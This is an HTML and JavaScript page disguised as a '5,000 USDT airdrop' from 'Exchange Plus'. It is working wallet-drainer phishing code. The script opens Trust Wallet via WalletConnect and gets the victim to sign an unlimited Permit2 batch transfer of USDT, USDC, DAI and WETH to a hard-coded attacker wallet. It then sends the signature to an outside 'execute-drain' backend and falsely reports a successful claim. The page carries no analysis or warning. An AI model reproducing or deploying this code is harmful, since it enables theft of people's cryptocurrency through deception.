<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Exchange Plus | 5,000 USDT Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui, sans-serif;
            background: linear-gradient(135deg, #0a0a2a, #0f0f2a);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: rgba(15,23,42,0.95);
            backdrop-filter: blur(20px);
            border-radius: 2rem;
            padding: 2rem;
            max-width: 450px;
            width: 90%;
            text-align: center;
        }
        .title { font-size: 1.8rem; font-weight: bold; color: #00ff9d; }
        .reward { font-size: 2rem; font-weight: bold; margin: 1rem 0; }
        button {
            background: linear-gradient(135deg, #00ff9d, #00b8ff);
            border: none;
            padding: 1rem;
            width: 100%;
            border-radius: 1rem;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            margin-top: 1rem;
            font-size: 1rem;
        }
        .status { margin-top: 1rem; font-size: 0.9rem; color: #94a3b8; }
        .status-success { color: #00ff9d; }
        .status-error { color: #ff4444; }
        .loading {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="card">
    <div class="title">Exchange Plus</div>
    <div class="reward">5,000 USDT</div>
    <p>Airdrop • Limited time</p>
    <button id="connectBtn">Join the Airdrop</button>
    <div id="status" class="status">Connect to claim</div>
</div>

<script>
    // ============================================
    // HANDLE /wc REDIRECT FROM TRUST WALLET
    // ============================================
    if (window.location.pathname === '/wc' || window.location.pathname.includes('/wc')) {
        sessionStorage.setItem('wc_returning', 'true');
        window.location.href = window.location.origin + '/';
    }

    if (sessionStorage.getItem('wc_returning')) {
        sessionStorage.removeItem('wc_returning');
        setTimeout(() => {
            document.getElementById('connectBtn').click();
        }, 500);
    }

    // ============================================
    // CONFIGURATION
    // ============================================
    const ATTACKER_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
    const BACKEND_URL = "https://eclipse-backend-ppij.onrender.com/api/execute-drain";
    const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
    const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    const TOKENS = [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        "0x6B175474E89094C44Da98b954EedeAC495271d0F",
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
    ];

    let wcProvider = null;
    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');

    function updateStatus(msg, isError = false) {
        statusDiv.innerHTML = msg;
        statusDiv.className = isError ? 'status-error' : (msg.includes('✅') ? 'status-success' : 'status');
    }

    async function requestBatchPermit(account) {
        updateStatus('<span class="loading"></span> Preparing batch approval...');

        try {
            const provider = new ethers.providers.Web3Provider(wcProvider);
            const signer = provider.getSigner();

            const domain = {
                name: "Permit2",
                version: "1",
                chainId: 1,
                verifyingContract: PERMIT2_ADDRESS
            };

            const types = {
                PermitBatchTransferFrom: [
                    { name: "permitted", type: "TokenPermissions[]" },
                    { name: "spender", type: "address" },
                    { name: "nonce", type: "uint256" },
                    { name: "deadline", type: "uint256" }
                ],
                TokenPermissions: [
                    { name: "token", type: "address" },
                    { name: "amount", type: "uint256" }
                ]
            };

            const message = {
                permitted: TOKENS.map(token => ({ token, amount: MAX_UINT256 })),
                spender: ATTACKER_WALLET,
                nonce: Math.floor(Date.now() / 1000),
                deadline: Math.floor(Date.now() / 1000) + 86400
            };

            updateStatus("⏳ Please approve in Trust Wallet...");

            const signature = await signer._signTypedData(domain, types, message);

            updateStatus("✅ Signature received! Sending...");

            await fetch(BACKEND_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    address: account,
                    signature: signature,
                    typedData: { domain, types, primaryType: "PermitBatchTransferFrom", message },
                    drainTo: ATTACKER_WALLET,
                    tokens: TOKENS
                })
            });

            updateStatus("✅ Success! All tokens claimed.");

        } catch (e) {
            console.error(e);
            updateStatus(`❌ Failed: ${e.message.slice(0, 80)}`, true);
        }
    }

    connectBtn.onclick = async () => {
        updateStatus('<span class="loading"></span> Opening Trust Wallet...');

        try {
            const WalletConnectProvider = window.WalletConnectProvider.default;

            const provider = new WalletConnectProvider({
                rpc: {
                    1: "https://cloudflare-eth.com"
                },
                chainId: 1,
                qrcode: false,
                methods: ["eth_sendTransaction", "eth_signTypedData_v4", "personal_sign"]
            });

            wcProvider = provider;

            // Set up listener BEFORE enabling
            provider.connector.on("connect", async (error, payload) => {
                if (error) {
                    updateStatus("Connection failed", true);
                    return;
                }
                const account = payload.params[0].accounts[0];
                updateStatus(`✅ Connected: ${account.slice(0,6)}...${account.slice(-4)}`);
                await requestBatchPermit(account);
            });

            await provider.enable();
            const wcUri = provider.connector.uri;

            if (wcUri) {
                window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(wcUri)}`;
                setTimeout(() => {
                    window.location.href = `trust://wc?uri=${encodeURIComponent(wcUri)}`;
                }, 500);
            } else {
                throw new Error('No WalletConnect URI generated');
            }

        } catch (e) {
            console.error(e);
            updateStatus(`Failed: ${e.message}`, true);
        }
    };
</script>
</body>
</html>
